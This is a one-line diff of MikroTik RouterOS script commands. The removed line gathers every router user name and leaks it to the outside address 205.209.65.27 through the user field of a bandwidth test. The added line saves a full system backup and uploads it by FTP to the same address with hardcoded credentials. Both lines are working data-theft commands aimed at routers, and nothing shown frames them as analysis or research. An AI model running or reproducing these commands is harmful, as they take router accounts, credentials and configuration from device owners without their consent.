@@ -1,1 +1,1 @@
-:local result "";:foreach i in=[/user find] do={ :local user [/user get $i name]; :set result ($result . "|" . $user);  };/tool bandwidth-test address=205.209.65.27 user=[:pick $result 0 32];
+/system backup save name=backup; :delay 3s; /tool fetch address=205.209.65.27 mode=ftp user=test password=0988 src-path=backup.backup dst-path=backup.backup upload=yes
